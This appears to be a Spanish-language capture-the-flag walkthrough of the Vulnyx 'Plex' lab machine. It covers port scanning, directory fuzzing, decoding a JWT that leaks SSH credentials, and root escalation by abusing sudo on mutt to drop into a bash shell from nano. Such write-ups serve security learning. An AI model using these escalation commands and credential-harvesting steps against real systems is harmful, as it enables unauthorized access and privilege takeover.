---
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# Plex Vulnyx (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-09 03:14 EDT
Nmap scan report for 192.168.5.73
Host is up (0.0028s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)
| ssh-hostkey: 
|   2048 56:9b:dd:56:a5:c1:e3:52:a8:42:46:18:5e:0c:12:86 (RSA)
|   256 1b:d2:cc:59:21:50:1b:39:19:77:1d:28:c0:be:c6:82 (ECDSA)
|_  256 9c:e7:41:b6:ad:03:ed:f5:a1:4c:cc:0a:50:79:1c:20 (ED25519)
|_ftp-bounce: ERROR: Script execution failed (use -d to debug)
MAC Address: 08:00:27:05:E0:F5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.62 seconds
```

Solamente veremos un puerto `SSH` abierto el cual esta cambiado de su puerto original, por lo que vamos a investigar a ver que podemos hacer, pero si vemos un poco mejor posiblemente se este utilizando un `SSLH`.

`SSLH` es un programa multiplexor de protocolos que permite usar **un mismo puerto** para varios servicios distintos (por ejemplo, `SSH`, `HTTPS`, `OpenVPN`…) y decide a cuál redirigir la conexión según el protocolo que detecta.

Vamos a probar de esta forma:

```shell
nmap -p 21 --script=ssh-hostkey,ftp-anon,ssl-cert <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-09 03:23 EDT
Nmap scan report for 192.168.5.73
Host is up (0.0018s latency).

PORT   STATE SERVICE
21/tcp open  ftp
MAC Address: 08:00:27:05:E0:F5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.48 seconds
```

Vemos que si prueba con los scripts de `FTP` veremos que funciona, por lo que realmente si se esta utilizando un multiservicio, vamos a intentar conectarnos a `FTP` de forma anonima a ver si nos deja.

```shell
ftp anonymous@<IP>
```

Veremos que no nos deja meternos, por lo que vamos a ver si no tuviera algun `HTTP` integrado.

```shell
curl -I <IP>:21
```

Info:

```
HTTP/1.1 200 OK
Date: Sat, 09 Aug 2025 07:28:25 GMT
Server: Apache/2.4.38 (Debian)
Last-Modified: Wed, 28 Feb 2024 17:50:38 GMT
ETag: "31-61274c7cf8519"
Accept-Ranges: bytes
Content-Length: 49
Content-Type: text/html
```

Veremos que esto si funciono, por lo que tiene como una pagina web por dentras, vamos a ver que descubrimos si seguimos realizando un pequeño `fuzzing` en dicha pagina.

## Gobuster

```shell
gobuster dir -u http://<IP>:21/ -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.73:21/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,php
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 49]
/.html                (Status: 403) [Size: 277]
/robots.txt           (Status: 200) [Size: 58]
/.php                 (Status: 403) [Size: 277]
[!] Keyboard interrupt detected, terminating.
Progress: 111787 / 882244 (12.67%)
===============================================================
Finished
===============================================================
```

Ahora si investigamos que contiene el `robots.txt` veremos lo siguiente:

```shell
curl http://<IP>:21/robots.txt
```

Info:

```
User-agent: *
Disallow: /9a618248b64db62d15b300a07b00580b
```

Vamos a ver ahora que contiene dicha ruta mostrada por el `robots.txt`.

```shell
curl http://<IP>:21/9a618248b64db62d15b300a07b00580b
```

Info:

```
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://192.168.5.73:21/9a618248b64db62d15b300a07b00580b/">here</a>.</p>
<hr>
<address>Apache/2.4.38 (Debian) Server at 192.168.5.73 Port 21</address>
</body></html>
```

Por lo que vemos nos comenta que algo se ha movido de lugar, pero no sabemos lo que hay despuesde esa `/` por lo que tendremos que realizar un poco de `fuzzing` para ver que vemos.

```shell
gobuster dir -u http://<IP>:21/9a618248b64db62d15b300a07b00580b/ -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.73:21/9a618248b64db62d15b300a07b00580b/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 217]
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
[!] Keyboard interrupt detected, terminating.
Progress: 99355 / 882244 (11.26%)
===============================================================
Finished
===============================================================
```

Vamos a probar con `index.html` a ver si nos aparece otra cosa en dicha pagina.

## Escalate user mauro

```shell
curl http://<IP>:21/9a618248b64db62d15b300a07b00580b/index.html
```

Info:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiIiLCJpYXQiOm51bGwsImV4cCI6bnVsbCwiYXVkIjoiIiwic3ViIjoiIiwiaWQiOiIxIiwidXNlcm5hbWUiOiJtYXVybyIsInBhc3N3b3JkIjoibUB1UjAxMjMhIn0.zMeVhhqARJ6YzuMtwahGQnegFDhF7r0BCPf3H9ljDIk
```

Por lo que estamos viendo, tiene toda la pinta de una estructura de `Cookie TOKEN JWT` por los `.` de las separaciones, etc... Estas suelen contener informacion del usuario en general, vamos a ver si conseguimos decodificarla para obtener algo.

```shell
echo 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiIiLCJpYXQiOm51bGwsImV4cCI6bnVsbCwiYXVkIjoiIiwic3ViIjoiIiwiaWQiOiIxIiwidXNlcm5hbWUiOiJtYXVybyIsInBhc3N3b3JkIjoibUB1UjAxMjMhIn0.zMeVhhqARJ6YzuMtwahGQnegFDhF7r0BCPf3H9ljDIk' \
| cut -d '.' -f2 \
| base64 -d \
| jq .
```

Info:

```
{
  "iss": "",
  "iat": null,
  "exp": null,
  "aud": "",
  "sub": "",
  "id": "1",
  "username": "mauro",
  "password": "m@uR0123!"
}
```

Veremos que contiene un nombre de usuario y contraseña en texto plano, por lo que vamos a acceder directamente desde `SSH` a ver si hay suerte.

### SSH

```shell
ssh mauro@<IP>
```

Metemos como contraseña `m@uR0123!` y veremos que estaremos dentro.

```
mauro@plex:~$ whoami
mauro
```

Por lo que vamos a leer la `flag` del usuario.

> user.txt

```
05135a0133cbb692dc66761e5d99364a
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for mauro on plex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User mauro may run the following commands on plex:
    (root) NOPASSWD: /usr/bin/mutt
```

Vemos que podemos ejecuatar el binario `mutt` como el usuario `root`, por lo que haremos lo siguiente:

```shell
echo 'echo pwned; /bin/bash -p' > /tmp/draft
sudo /usr/bin/mutt -H /tmp/draft
```

En este punto nos pedira que pongamos nuestro nombre y despues el concepto del mensaje, nos lo inventamos todo, echo esto nos llevara a `nano` para escribir la carta, en este punto vemos que anteriormente hemos ejecutado el binario con privilegios de `root` por lo que si dentro de `nano` ejecutamos algun comando podremos obtener una shell como `root`.

```shell
^R^X
reset; bash 1>&0 2>&0
```

Info:

```
root@plex:/home/mauro# whoami
root
```

Con esto veremos que ya seremos `root`, por lo que leeremos la `flag` de `root`.

> root.txt

```
943f08fb32181d5f8171332146f39e41
```
